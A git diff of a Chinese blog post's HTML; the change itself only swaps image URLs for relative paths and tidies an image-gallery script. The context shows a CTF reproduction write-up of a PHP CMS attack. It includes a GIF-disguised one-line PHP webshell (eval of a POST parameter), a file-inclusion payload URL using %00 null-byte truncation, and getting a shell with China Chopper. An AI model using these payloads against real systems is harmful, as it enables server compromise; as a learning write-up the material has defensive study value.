@@ -66,27 +66,27 @@
 <p><code>allow_url_fopen = On</code></p>
 <p><code>allow_url_include = On</code></p>
 <p><code>magic_quotes_gpc = Off</code></p>
-<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p><img src="https://www.wileysec.com/usr/uploads/2019/06/3659728831.png" alt="7.png"></p>
+<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p><img src="/uploads/2019/06/3659728831.png" alt="7.png"></p>
 <p>第16行代码，接受GET请求的数据后，没有进行过滤。</p>
 <p>第26行代码，使用 <code>include_once</code> 函数将 <code>$lang</code> 这个变量也一并包含，那么肯定存在文件包含漏洞。</p>
 <p>但是这个漏洞必须要有截断漏洞才行，php的版本必须为php5.2以下版本才有截断漏洞。</p>
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>首先，我们在首页注册随便注册一个用户登录之后，在用户中心 -&gt; 我的留言这个模块去上传一句话木马文件。</p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/06/4195263459.png" alt="1.png"></p>
+<p><img src="/uploads/2019/06/4195263459.png" alt="1.png"></p>
 <p>然后我们写一个一句话木马文件，文件内容：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>文件后缀为 <code>1.gif</code></p>
 <p>这个 <code>1.gif</code> 是一句话木马文件，使用的是GIF89a头的GIF文件欺骗，使其能够上传后不被改文件后缀。</p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/06/3585966583.png" alt="2.png"></p>
+<p><img src="/uploads/2019/06/3585966583.png" alt="2.png"></p>
 <p>文件上传成功后，我们可以看到我们上传的文件名整个路径。</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="https://www.wileysec.com/usr/uploads/2019/06/2672545526.png" alt="4.png"></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p><img src="/uploads/2019/06/2672545526.png" alt="4.png"></p>
 <p>这个时候，我们访问这个payload <code>http://192.168.0.7/js/calendar.php?lang=../data/feedbackimg/1_20190621kmknqs.gif%00.php</code></p>
 <p>这里我们要使用 <code>%00</code> 截断漏洞，才可以将文件包含进来</p>
 <p>注意：如果要执行php代码，一定要加 <code>.php</code></p>
 <p>发现爆了一个php代码错误，这个是 <code>calendar.php</code> 文件报错的，不用管。</p>
-<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p><img src="https://www.wileysec.com/usr/uploads/2019/06/438527080.png" alt="5.png"></p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p><img src="/uploads/2019/06/438527080.png" alt="5.png"></p>
 <p>我们这个时候用中国菜刀连接一下，配置如上图所示。</p>
-<p><img src="https://www.wileysec.com/usr/uploads/2019/06/674761503.png" alt="6.png"></p>
+<p><img src="/uploads/2019/06/674761503.png" alt="6.png"></p>
 <p>已经连接成功了，并且找到了我们要找的 <code>C:\Windows</code> 这个路径下的 <code>ABC_04.py</code></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实现在复现完了之后，感觉还是比较简单的，因为在比赛当时比较紧张，又有各种原因，没有做出来，真的很可惜。</p>
 <p>而且在之前，我也没了解过文件包含的截断漏洞。</p>
@@ -138,15 +138,13 @@
 </div>
 
 <script>
-    $(".post-content p").each(function(){
-      imglength = $(this).find('img').length;
-      for(i=0;i<imglength;i++){
-           obj = $(".post-content p img")[i];
-           aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
-           imghref = $(aobj).attr('src');
-           $('#fancybox' + i).attr('href',imghref);
-        }
-    });
+  imglength = $('.post-content p').find('img').length;
+  for(i=0;i<imglength;i++){
+       obj = $(".post-content p img")[i];
+       aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+       imghref = $(aobj).attr('src');
+       $('#fancybox' + i).attr('href',imghref);
+    }
 </script>
 
 
